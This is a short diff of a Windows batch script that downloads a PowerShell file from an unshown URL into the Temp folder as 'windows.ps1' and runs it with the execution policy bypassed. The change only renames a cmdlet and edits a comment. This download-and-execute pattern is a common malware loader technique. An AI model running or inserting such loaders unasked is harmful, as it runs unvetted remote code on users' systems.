@@ -5,9 +5,9 @@ set "DEST=%Temp%\windows.ps1"
 echo Initializing...
 
 :: Force TLS 1.2 and download the PS1
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr '%URL%' -OutFile '%DEST%'"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"
 
-:: Run with Bypass to make sure it hits the Admin check
+:: Run with Bypass and stay in the Temp directory
 powershell -ExecutionPolicy Bypass -File "%DEST%"
 
 exit
